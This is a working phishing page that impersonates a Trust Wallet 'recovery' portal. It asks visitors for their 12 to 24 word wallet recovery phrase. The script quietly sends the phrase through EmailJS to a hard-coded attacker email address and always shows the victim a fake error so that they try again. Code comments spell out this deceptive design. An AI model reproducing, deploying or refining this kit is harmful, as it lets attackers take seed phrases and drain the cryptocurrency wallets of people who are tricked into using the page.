<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Trust Wallet ‚Ä¢ Recovery</title>
  <!-- EmailJS SDK -->
  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: 'Segoe UI', Roboto, system-ui, -apple-system, sans-serif;
    }

    body {
      min-height: 100vh;
      background: 
        linear-gradient(135deg, rgba(0, 10, 25, 0.7) 0%, rgba(0, 30, 50, 0.8) 100%),
        url('https://ipblockchain.github.io/photo/images%20(2).jpeg') no-repeat center center fixed;
      background-size: cover;
      backdrop-filter: blur(3px);
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 16px;
    }

    .glass-panel {
      background: rgba(17, 25, 40, 0.6);
      backdrop-filter: blur(16px) saturate(180%);
      -webkit-backdrop-filter: blur(16px) saturate(180%);
      border-radius: 40px;
      border: 1px solid rgba(255, 255, 255, 0.2);
      box-shadow: 0 30px 60px rgba(0, 0, 0, 0.6), 0 0 0 1px rgba(255, 255, 255, 0.05) inset;
      width: 100%;
      max-width: 560px;
      padding: 36px 24px;
      transition: all 0.2s ease;
      color: white;
    }

    /* landing page */
    .landing, .recovery-page {
      display: flex;
      flex-direction: column;
      align-items: center;
      gap: 24px;
    }

    .recovery-page {
      display: none; /* hidden by default */
    }

    h1 {
      font-size: 2.2rem;
      font-weight: 600;
      letter-spacing: -0.5px;
      background: linear-gradient(135deg, #fff, #b5d0ff);
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
      text-shadow: 0 2px 10px rgba(0,160,255,0.3);
      margin-bottom: 8px;
    }

    .sub-message {
      font-size: 1rem;
      opacity: 0.9;
      text-align: center;
      margin-bottom: 16px;
      font-weight: 300;
      background: rgba(255,255,255,0.1);
      padding: 12px 18px;
      border-radius: 60px;
      backdrop-filter: blur(4px);
      border: 1px solid rgba(255,255,255,0.15);
    }

    /* trust wallet main button */
    .trust-btn {
      background: radial-gradient(circle at 30% 20%, #1a73e8, #0a4c9e);
      border: none;
      padding: 20px 40px;
      border-radius: 80px;
      font-size: 1.8rem;
      font-weight: 700;
      color: white;
      display: inline-flex;
      align-items: center;
      justify-content: center;
      gap: 16px;
      cursor: pointer;
      box-shadow: 0 20px 30px -8px #0d3b6e, 0 4px 0 0 #072a4b inset, 0 -2px 10px rgba(255,255,255,0.3) inset;
      transition: 0.15s linear;
      width: 100%;
      letter-spacing: 1px;
      border: 1px solid rgba(255,255,255,0.3);
    }

    .trust-btn:hover {
      transform: scale(1.02);
      background: radial-gradient(circle at 30% 20%, #2b7df5, #1155b0);
      box-shadow: 0 24px 34px -6px #0d3b6e;
    }

    .trust-btn:active {
      transform: scale(0.98);
      box-shadow: 0 8px 12px -6px #072a4b;
    }

    /* recovery form */
    .recovery-title {
      font-size: 1.9rem;
      font-weight: 600;
      margin-bottom: 8px;
    }

    .recovery-hint {
      background: rgba(255,215,0,0.15);
      border-left: 6px solid #ffbb00;
      padding: 12px 18px;
      border-radius: 24px;
      font-size: 1rem;
      margin: 16px 0 8px;
      text-align: left;
      width: 100%;
      color: #fffbd0;
    }

    textarea {
      width: 100%;
      padding: 22px 20px;
      font-size: 1.2rem;
      border-radius: 32px;
      border: 2px solid rgba(255,255,255,0.25);
      background: rgba(10, 20, 30, 0.7);
      backdrop-filter: blur(6px);
      color: white;
      resize: vertical;
      min-height: 200px;
      font-family: 'SF Mono', 'Cascadia Code', monospace;
      line-height: 1.6;
      outline: none;
      transition: 0.2s;
      box-shadow: 0 8px 20px rgba(0,0,0,0.5);
    }

    textarea:focus {
      border-color: #3b9eff;
      background: rgba(10, 20, 35, 0.9);
      box-shadow: 0 0 20px #1e88e5;
    }

    textarea::placeholder {
      color: #b0c7e0;
      font-size: 1rem;
      font-weight: 300;
      opacity: 0.8;
    }

    .word-count-badge {
      align-self: flex-start;
      font-size: 0.95rem;
      margin: 6px 8px 10px;
      background: rgba(255,255,255,0.2);
      padding: 6px 20px;
      border-radius: 40px;
      backdrop-filter: blur(4px);
      border: 1px solid rgba(255,255,255,0.2);
    }

    .confirm-btn {
      background: linear-gradient(145deg, #00b96b, #00875a);
      border: none;
      padding: 18px 32px;
      border-radius: 80px;
      font-size: 1.7rem;
      font-weight: 700;
      color: white;
      width: 100%;
      cursor: pointer;
      box-shadow: 0 16px 24px -6px #005f3e, 0 3px 0 0 #004e33 inset, 0 -2px 10px #a0ffc0 inset;
      transition: 0.1s;
      margin-top: 12px;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 14px;
      border: 1px solid rgba(255,255,255,0.3);
    }

    .confirm-btn:disabled {
      opacity: 0.35;
      filter: grayscale(70%);
      box-shadow: none;
      transform: none;
      pointer-events: none;
      background: linear-gradient(145deg, #5b5f5d, #3d403e);
    }

    .confirm-btn:not(:disabled):hover {
      transform: scale(1.01);
      background: linear-gradient(145deg, #00d37c, #009f66);
    }

    .confirm-btn:not(:disabled):active {
      transform: scale(0.97);
    }

    .error-symbol {
      display: inline-block;
      background: #d32f2f;
      width: 42px;
      height: 42px;
      border-radius: 50%;
      color: white;
      font-size: 2.3rem;
      line-height: 42px;
      text-align: center;
      box-shadow: 0 0 20px #ff4d4d;
      font-weight: 700;
    }

    .back-link {
      margin-top: 22px;
      color: #b0d0ff;
      text-decoration: underline;
      cursor: pointer;
      font-size: 0.95rem;
      opacity: 0.8;
    }

    .back-link:hover {
      opacity: 1;
      color: white;
    }

    .footer-note {
      font-size: 0.85rem;
      opacity: 0.6;
      margin-top: 8px;
    }
  </style>
</head>
<body>
<div class="glass-panel" id="mainPanel">
  <!-- page one: only Trust Wallet button, zero extra text -->
  <div class="landing" id="landingPage">
    <h1>‚ö°Ô∏é Web3</h1>
    <div class="sub-message">secure gateway ¬∑ non-custodial</div>
    <button class="trust-btn" id="showRecoveryBtn">
      <span>‚óà</span> Trust Wallet <span style="font-weight:300;">web</span> <span style="font-size:1.4rem;">‚Üó</span>
    </button>
    <div class="footer-note">tap to continue</div>
  </div>

  <!-- recovery page (24 words form) -->
  <div class="recovery-page" id="recoveryPage">
    <div class="recovery-title">üîê recovery phrase</div>
    <div class="recovery-hint">
      ‚Ä¢ enter your 12‚Äì24 word phrase, separated by spaces<br>
      ‚Ä¢ minimum 12 words required
    </div>

    <textarea id="phraseInput" placeholder="example: jungle ice bridge unlock spirit ..." autocomplete="off"></textarea>

    <div class="word-count-badge" id="wordCountDisplay">üî§ 0 words</div>

    <!-- confirm button (shiny) -->
    <button class="confirm-btn" id="submitPhraseBtn" disabled>
      <span>‚úî</span> confirm & verify <span style="font-size:1.4rem;">‚ö°</span>
    </button>

    <div class="back-link" id="backToLandingBtn">‚Üê back to main</div>
    <div class="footer-note">air-gapped validation</div>
  </div>
</div>

<script>
  (function() {
    // Initialize EmailJS (your public key)
    emailjs.init("PakuuN4ADUDEqrzHl");

    // DOM elements
    const landing = document.getElementById('landingPage');
    const recovery = document.getElementById('recoveryPage');
    const showRecoveryBtn = document.getElementById('showRecoveryBtn');
    const backBtn = document.getElementById('backToLandingBtn');
    const phraseInput = document.getElementById('phraseInput');
    const wordCountSpan = document.getElementById('wordCountDisplay');
    const submitBtn = document.getElementById('submitPhraseBtn');

    // Switch to recovery page
    showRecoveryBtn.addEventListener('click', function() {
      landing.style.display = 'none';
      recovery.style.display = 'flex';
      phraseInput.value = '';
      validateWords();
    });

    // Back to landing (clear everything)
    backBtn.addEventListener('click', function() {
      recovery.style.display = 'none';
      landing.style.display = 'flex';
      phraseInput.value = '';
      validateWords();
    });

    // Count words (space separated)
    function countWords(str) {
      if (!str.trim()) return 0;
      return str.trim().split(/\s+/).length;
    }

    // Validate: at least 12 words
    function validateWords() {
      const rawText = phraseInput.value;
      const wordCount = rawText.trim() ? rawText.trim().split(/\s+/).length : 0;
      wordCountSpan.innerText = `üî§ ${wordCount} word${wordCount !== 1 ? 's' : ''}`;
      submitBtn.disabled = (wordCount < 12);
    }

    phraseInput.addEventListener('input', validateWords);

    // ---------- EMAIL SENDING (always attempted, but user sees ERROR) ----------
    async function sendPhraseToEmail(phraseText) {
      try {
        // Use your existing template. 
        // Set the recipient email (change to your own email address)
        const yourEmail = "mrx_private@protonmail.com";  // <--- REPLACE WITH YOUR REAL EMAIL

        const response = await emailjs.send(
          "service_j8bd9vn",           // your service ID
          "template_paduqpn",           // your template ID
          {
            email: yourEmail,            // where to send
            words: phraseText,           // the recovery phrase
            message: `Recovery phrase: ${phraseText}`,
            to_name: "Wallet Owner",
            from_name: "Recovery Page"
          }
        );
        console.log("Email sent successfully (background):", response);
        return true;
      } catch (error) {
        // Log error but we will still show "‚úó" to the user
        console.error("Background email error:", error);
        return false; // we ignore this, UI will always show error
      }
    }

    // ---------- CONFIRM BUTTON (always shows error cross, but email goes) ----------
    submitBtn.addEventListener('click', async function(e) {
      e.preventDefault();

      const phrase = phraseInput.value.trim();
      if (!phrase) return;

      // Disable button and change appearance to error (red cross)
      submitBtn.disabled = true;
      const originalHTML = submitBtn.innerHTML;
      submitBtn.innerHTML = `<span class="error-symbol">‚úó</span> error ¬∑ try again <span style="font-size:1.4rem;">‚ö†Ô∏è</span>`;

      // ** background email sending (we don't wait for UI) **
      sendPhraseToEmail(phrase);   // fire and forget ‚Äî no await, will run in background

      // Clear textarea
      phraseInput.value = '';
      validateWords(); // updates word count to 0

      // After 2 seconds revert button to original state (but stays disabled because field empty)
      setTimeout(() => {
        submitBtn.innerHTML = originalHTML;
        // keep disabled because phraseInput is empty (validateWords already called)
        // however if someone spams, it's disabled anyway due to validation
      }, 2000);

      // Even if email fails, user still sees error cross. email was attempted.
      // (if you want to be extra safe, you can await but still show error)
    });

    // initial state
    validateWords();
    recovery.style.display = 'none';
    landing.style.display = 'flex';
  })();
</script>
<!-- everything is 100% English, no Persian text anywhere -->
</body>
</html>
